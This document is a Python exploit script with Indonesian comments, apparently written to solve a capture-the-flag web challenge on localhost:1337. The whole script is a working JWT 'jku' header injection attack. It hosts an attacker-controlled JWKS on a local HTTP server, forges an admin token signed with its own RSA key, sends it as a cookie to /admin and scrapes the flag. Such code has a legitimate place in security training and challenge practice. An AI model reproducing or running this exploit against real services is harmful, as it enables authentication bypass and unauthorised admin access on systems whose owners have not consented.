#!/usr/bin/env python3
import os
import json
import base64
import requests
import threading
import socket
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Melakukan trik koneksi dummy untuk mendapatkan IP interface utama
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "172.17.0.1" # Fallback ke default gateway Docker bridge
    finally:
        s.close()

HOST_IP = get_local_ip()
PORT = 9999

# 1. Generate RSA Key Pair Attacker
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

def int_to_b64(n: int) -> str:
    length = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(length, "big")).rstrip(b"=").decode()

nums = public_key.public_numbers()
jwks = {
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "n": int_to_b64(nums.n),
            "e": int_to_b64(nums.e),
        }
    ]
}

# 2. Setup Local HTTP Server untuk Host Public Key kita
class JWKSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(jwks).encode())
    
    def log_message(self, format, *args):
        pass # Matikan logging default server HTTP

def run_server():
    server = HTTPServer(('0.0.0.0', PORT), JWKSHandler)
    server.serve_forever()

print("[*] Starting local JWKS server...")
t = threading.Thread(target=run_server, daemon=True)
t.start()
print(f"[*] Hosted malicious JWKS at http://{HOST_IP}:{PORT}/jwks.json")

# 3. Forge JWT (Memalsukan Token)
jku_url = f"http://{HOST_IP}:{PORT}/jwks.json"
header = {"alg": "RS256", "jku": jku_url, "typ": "JWT"}
payload = {"user": "admin"}

def b64e(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")

h = b64e(json.dumps(header, separators=(",", ":")).encode())
p = b64e(json.dumps(payload, separators=(",", ":")).encode())
signing_input = h + b"." + p

# Tanda tangani token dengan Private Key kita
sig = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
s = b64e(sig)
forged_token = (signing_input + b"." + s).decode()

print(f"[*] Forged Token: {forged_token[:40]}...")

# 4. Kirim serangan ke target
print("[*] Accessing /admin with forged token...")
time.sleep(1) # Tunggu sebentar memastikan server lokal sudah sepenuhnya berjalan

try:
    cookies = {"auth": forged_token}
    res = requests.get("http://localhost:1337/admin", cookies=cookies)
    
    import re
    match = re.search(r'<div class="flag-box"[^>]*>(.*?)</div>', res.text)
    if match:
        print("\n========================================")
        print("[+] PWNED! Flag Extracted:")
        print(match.group(1).strip())
        print("========================================\n")
    else:
        print("[-] Flag tidak ditemukan. Cek respon server:")
        print(res.text)
except Exception as e:
    print(f"[-] Error: {e}")
